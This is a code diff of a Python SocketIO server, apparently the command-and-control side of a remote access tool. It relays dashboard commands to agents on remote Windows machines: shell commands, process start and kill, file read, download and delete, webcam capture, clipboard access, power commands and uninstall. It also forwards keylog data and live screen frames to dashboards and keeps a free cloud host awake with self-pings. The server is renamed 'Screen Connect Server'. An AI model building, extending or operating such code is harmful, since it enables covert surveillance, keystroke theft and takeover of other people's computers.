+            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)
 
     # ── Dashboard → Agent: system monitor ──────────────────────
     @sio.on("start_sysmon")
@@ -1081,7 +1120,7 @@ if SOCKETIO_OK and sio:
             sio.emit("request_action", {
                 "tab": "system", "action": "start",
                 "interval": data.get("interval", 2), "device_id": did,
-            }, to=dev["sid"])
+            }, room=did)
 
     @sio.on("stop_sysmon")
     def on_stop_sysmon(data):
@@ -1089,7 +1128,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "system", "action": "stop", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "system", "action": "stop", "device_id": did}, room=did)
 
     @sio.on("request_snapshot")
     def on_snapshot(data):
@@ -1097,7 +1136,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "system_snapshot", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "system_snapshot", "device_id": did}, room=did)
 
     @sio.on("request_disks")
     def on_disks(data):
@@ -1105,7 +1144,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "disks", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "disks", "device_id": did}, room=did)
 
     @sio.on("request_network")
     def on_network(data):
@@ -1113,7 +1152,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "network", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "network", "device_id": did}, room=did)
 
     # ── Dashboard → Agent: processes ────────────────────────────
     @sio.on("list_processes")
@@ -1122,7 +1161,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "processes", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "processes", "device_id": did}, room=did)
 
     @sio.on("kill_process")
     def on_kill_proc(data):
@@ -1130,7 +1169,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "kill_process", "pid": data.get("pid"), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "kill_process", "pid": data.get("pid"), "device_id": did}, room=did)
 
     @sio.on("start_process")
     def on_start_proc(data):
@@ -1138,7 +1177,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "start_process", "command": data.get("command", ""), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "start_process", "command": data.get("command", ""), "device_id": did}, room=did)
 
     # ── Dashboard → Agent: shell ─────────────────────────────────
     @sio.on("shell_command")
@@ -1152,7 +1191,7 @@ if SOCKETIO_OK and sio:
                 "command":    data.get("command", "echo hello"),
                 "shell_type": data.get("shell_type", "cmd"),
                 "device_id":  did,
-            }, to=dev["sid"])
+            }, room=did)
 
     # ── Dashboard → Agent: file browser ─────────────────────────
     @sio.on("file_list")
@@ -1161,7 +1200,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "file_list", "path": data.get("path", "C:\\"), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "file_list", "path": data.get("path", "C:\\"), "device_id": did}, room=did)
 
     @sio.on("file_read")
     def on_file_read(data):
@@ -1169,7 +1208,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "file_read", "path": data.get("path", ""), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "file_read", "path": data.get("path", ""), "device_id": did}, room=did)
 
     @sio.on("file_download")
     def on_file_download(data):
@@ -1177,7 +1216,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "file_download", "path": data.get("path", ""), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "file_download", "path": data.get("path", ""), "device_id": did}, room=did)
 
     @sio.on("file_delete")
     def on_file_delete(data):
@@ -1185,7 +1224,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "file_delete", "path": data.get("path", ""), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "file_delete", "path": data.get("path", ""), "device_id": did}, room=did)
 
     @sio.on("list_drives")
     def on_list_drives(data):
@@ -1193,7 +1232,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "drives", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "drives", "device_id": did}, room=did)
 
     # ── Dashboard → Agent: webcam ─────────────────────────────
     @sio.on("webcam_capture")
@@ -1202,7 +1241,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "webcam", "camera": data.get("camera", 0), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "webcam", "camera": data.get("camera", 0), "device_id": did}, room=did)
 
     @sio.on("webcam_list")
     def on_webcam_list(data):
@@ -1210,7 +1249,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, room=did)
 
     # ── Dashboard → Agent: clipboard ───────────────────────────
     @sio.on("clipboard_get")
@@ -1219,7 +1258,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "clipboard_get", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "clipboard_get", "device_id": did}, room=did)
 
     @sio.on("clipboard_set")
     def on_clip_set(data):
@@ -1227,18 +1266,18 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "clipboard_set", "text": data.get("text", ""), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "clipboard_set", "text": data.get("text", ""), "device_id": did}, room=did)
 
     # ── Dashboard → Agent: power commands ──────────────────────
     @sio.on("power_command")
     def on_power(data):
         did = data.get("device_id", "")
-        cmd = data.get("command", "")   # lock_screen | sleep | shutdown | restart | abort_shutdown
+        cmd = data.get("command", "")
         with _dev_lock:
             dev = _devices.get(did)
         if dev and cmd in ("lock_screen", "sleep", "shutdown", "restart", "abort_shutdown"):
-            sio.emit("request_action", {"tab": cmd, "device_id": did}, to=dev["sid"])
-            log.info(f"Power command '{cmd}' → {did}")
+            sio.emit("request_action", {"tab": cmd, "device_id": did}, room=did)
+            log.info(f"Power command '{cmd}' -> {did}")
 
     # ── Dashboard → Agent: uninstall ────────────────────────────
     @sio.on("uninstall_agent")
@@ -1247,116 +1286,160 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "uninstall", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "uninstall", "device_id": did}, room=did)
 
     # ══════════════════════════════════════════════════════════
-    #  Agent → Dashboard relay handlers
-    #  Every event from the agent is forwarded to all dashboard
-    #  clients (skip_sid excludes the agent's own connection).
+    #  Agent → Dashboard relay
+    #
+    #  THE CORE FIX: Instead of sio.emit(..., skip_sid=agent_sid)
+    #  which is broken in gevent single-worker mode, we now emit
+    #  to the "view:{device_id}" room (for frames) or "dashboards"
+    #  room (for everything else).
+    #
+    #  Agents never join view: rooms. Dashboards join them on
+    #  subscribe_stream / start_stream. This is the correct
+    #  room-based relay architecture.
     # ══════════════════════════════════════════════════════════
 
     @sio.on("screen_data")
     def on_screen_data(data):
+        """
+        PRIMARY STREAMING RELAY — called every frame from agent.
+        Relays ONLY to dashboards viewing this device.
+        Tracks frame stats. Sends flow-control ack to agent.
+        """
+        did = data.get("device_id", "")
         out = dict(data)
-        # Normalise field names — agent sends both 'frame' and 'image'
+        # Normalise: agent sends both 'frame' and 'image', ensure both set
         if "image" in out and "frame" not in out:
             out["frame"] = out.pop("image")
-        sio.emit("screenshot", out, skip_sid=request.sid)
+        if "frame" in out and "image" not in out:
+            out["image"] = out["frame"]
+
+        # Frame stats
+        frame_bytes = len(out.get("frame", ""))
+        now = time.time()
+        with _frame_stats_lock:
+            _frame_stats[did].append((now, frame_bytes))
+        with _dev_lock:
+            if did in _devices:
+                _devices[did]["frame_count"]   = _devices[did].get("frame_count", 0) + 1
+                _devices[did]["last_frame_ts"] = utcnow()
+
+        # Relay to viewer room (dashboards watching this device)
+        view_room = f"view:{did}"
+        sio.emit("screenshot",   out, room=view_room)
+        sio.emit("screen_frame", out, room=view_room)
+
+        # Flow-control ack back to agent (prevents buffer pile-up)
+        frame_num = 0
+        with _dev_lock:
+            frame_num = _devices.get(did, {}).get("frame_count", 0)
+        sio.emit("frame_ack", {
+            "device_id": did,
+            "frame_num": frame_num,
+            "ts":        utcnow(),
+        }, room=request.sid)
 
     @sio.on("screenshot_result")
     def on_screenshot_result(data):
+        did = data.get("device_id", "")
         out = dict(data)
         if "image" in out and "frame" not in out:
             out["frame"] = out.pop("image")
-        sio.emit("screenshot", out, skip_sid=request.sid)
+        if "frame" in out and "image" not in out:
+            out["image"] = out["frame"]
+        sio.emit("screenshot", out, room=f"view:{did}")
+        sio.emit("screenshot_result", out, room="dashboards", skip_sid=request.sid)
 
     @sio.on("ping_result")
     def on_ping_result(data):
-        sio.emit("pong_agent", data, skip_sid=request.sid)
+        sio.emit("pong_agent", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("cursor_event")
     def on_cursor(data):
-        sio.emit("cursor_event", data, skip_sid=request.sid)
+        did = data.get("device_id", "")
+        # Cursor events only go to viewers of this device
+        sio.emit("cursor_event", data, room=f"view:{did}")
 
     @sio.on("system_stats_report")
     def _r_system(data):
-        sio.emit("update_system_tab", data, skip_sid=request.sid)
+        sio.emit("update_system_tab", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("processes_report")
     def _r_procs(data):
-        sio.emit("processes_result", data, skip_sid=request.sid)
+        sio.emit("processes_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("kill_result")
     def _r_kill(data):
-        sio.emit("kill_result", data, skip_sid=request.sid)
+        sio.emit("kill_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("start_process_result")
     def _r_start_proc(data):
-        sio.emit("start_process_result", data, skip_sid=request.sid)
+        sio.emit("start_process_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("shell_result")
     def _r_shell(data):
-        sio.emit("shell_result", data, skip_sid=request.sid)
+        sio.emit("shell_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("file_list_result")
     def _r_flist(data):
-        sio.emit("file_list_result", data, skip_sid=request.sid)
+        sio.emit("file_list_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("file_read_result")
     def _r_fread(data):
-        sio.emit("file_read_result", data, skip_sid=request.sid)
+        sio.emit("file_read_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("file_download_result")
     def _r_fdl(data):
-        sio.emit("file_download_result", data, skip_sid=request.sid)
+        sio.emit("file_download_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("file_delete_result")
     def _r_fdel(data):
-        sio.emit("file_delete_result", data, skip_sid=request.sid)
+        sio.emit("file_delete_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("drives_report")
     def _r_drives(data):
-        sio.emit("drives_report", data, skip_sid=request.sid)
+        sio.emit("drives_report", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("disks_report")
     def _r_disks(data):
-        sio.emit("disks_report", data, skip_sid=request.sid)
+        sio.emit("disks_report", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("network_report")
     def _r_net(data):
-        sio.emit("network_report", data, skip_sid=request.sid)
+        sio.emit("network_report", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("webcam_result")
     def _r_webcam(data):
-        sio.emit("webcam_result", data, skip_sid=request.sid)
+        sio.emit("webcam_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("webcam_list_result")
     def _r_wcam_list(data):
-        sio.emit("webcam_list_result", data, skip_sid=request.sid)
+        sio.emit("webcam_list_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("keylog_data")
     def _r_keylog(data):
-        sio.emit("keylog_data", data, skip_sid=request.sid)
+        sio.emit("keylog_data", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("clipboard_data")
     def _r_clip(data):
-        sio.emit("clipboard_data", data, skip_sid=request.sid)
+        sio.emit("clipboard_data", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("clipboard_result")
     def _r_clip_result(data):
-        sio.emit("clipboard_result", data, skip_sid=request.sid)
+        sio.emit("clipboard_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("clipboard_set_result")
     def _r_clip_set(data):
-        sio.emit("clipboard_set_result", data, skip_sid=request.sid)
+        sio.emit("clipboard_set_result", data, room="dashboards", skip_sid=request.sid)
 
     @sio.on("action_result")
     def _r_action(data):
-        sio.emit("action_result", data, skip_sid=request.sid)
+        sio.emit("action_result", data, room="dashboards", skip_sid=request.sid)
 
     # ══════════════════════════════════════════════════════════
-    #  Watchdog background task
-    #  Runs every 15s; marks devices offline if heartbeat silent
+    #  Watchdog — marks devices offline if heartbeat is silent
     # ══════════════════════════════════════════════════════════
     def _watchdog_loop():
         while True:
@@ -1385,27 +1468,63 @@ if SOCKETIO_OK and sio:
 
     sio.start_background_task(_watchdog_loop)
 
+    # ══════════════════════════════════════════════════════════
+    #  Render keep-alive self-ping
+    #
+    #  WHY: Render free tier spins down after 15 min of no HTTP
+    #  traffic. When agent is connected, all traffic is WebSocket
+    #  — no HTTP hits. After 15 min, next WebSocket upgrade or
+    #  HTTP request gets a 502 Bad Gateway.
+    #
+    #  FIX: Ping our own /health endpoint every 4 minutes via
+    #  HTTP to keep the Render instance warm. This is the same
+    #  technique used by UptimeRobot and similar services.
+    #
+    #  Set SELF_PING_INTERVAL=0 env var to disable on paid plans.
+    # ══════════════════════════════════════════════════════════
+    def _self_ping_loop():
+        if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
+            log.info("Self-ping disabled (SELF_PING_INTERVAL=0 or requests not installed)")
+            return
+        time.sleep(90)   # wait 90s before first ping (let server fully start)
+        render_url = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
+        local_url  = f"http://127.0.0.1:{PORT}/health"
+        ping_url   = f"{render_url}/health" if render_url else local_url
+        log.info(f"Self-ping loop started: {ping_url} every {SELF_PING_INTERVAL}s")
+        while True:
+            try:
+                resp = _requests.get(ping_url, timeout=15)
+                log.debug(f"Self-ping: {resp.status_code} {ping_url}")
+            except Exception as e:
+                log.debug(f"Self-ping failed (harmless if just started): {e}")
+            time.sleep(SELF_PING_INTERVAL)
+
+    sio.start_background_task(_self_ping_loop)
+
 # ══════════════════════════════════════════════════════════════
 #  Startup banner
 # ══════════════════════════════════════════════════════════════
 def startup():
     log.info("=" * 65)
-    log.info(f"  M-VIEW Server  v{VERSION}  (Render-ready + GitHub Releases)")
+    log.info(f"  Screen Connect Server  v{VERSION}")
     log.info("=" * 65)
     local = Path(AGENT_DIR) / AGENT_FILE
     if local.is_file():
-        log.info(f"  ✓ Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
+        log.info(f"  Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
     else:
-        log.info(f"  — Agent (local):    not found — using GitHub Releases")
-    log.info(f"  ✓ Agent (github):  {AGENT_STORAGE_URL}")
-    log.info(f"  ✓ Supabase:         {SUPABASE_URL[:55]}")
-    log.info(f"  ✓ SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
-    log.info(f"  ✓ Port:             {PORT}")
-    log.info(f"  ✓ Watchdog:         marks offline after {HEARTBEAT_TIMEOUT}s silence")
+        log.info(f"  Agent (local):    not found — using GitHub Releases")
+    log.info(f"  Agent (github):   {AGENT_STORAGE_URL}")
+    log.info(f"  Supabase:         {SUPABASE_URL[:55]}")
+    log.info(f"  SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
+    log.info(f"  Port:             {PORT}")
+    log.info(f"  Heartbeat ttl:    {HEARTBEAT_TIMEOUT}s")
+    log.info(f"  Self-ping:        every {SELF_PING_INTERVAL}s (Render keep-alive)")
+    log.info(f"  WS keep-alive:    ping=20s / timeout=60s")
+    log.info(f"  Frame relay:      room-based (view:device_id rooms)")
     log.info("=" * 65)
-    log.info("  Render start command:")
+    log.info("  RENDER start command:")
     log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
-    log.info("             -w 1 --timeout 120 --bind 0.0.0.0:$PORT server:app")
+    log.info("             -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app")
     log.info("  Local dev:")
     log.info("    py -3.12 server.py")
     log.info("=" * 65)
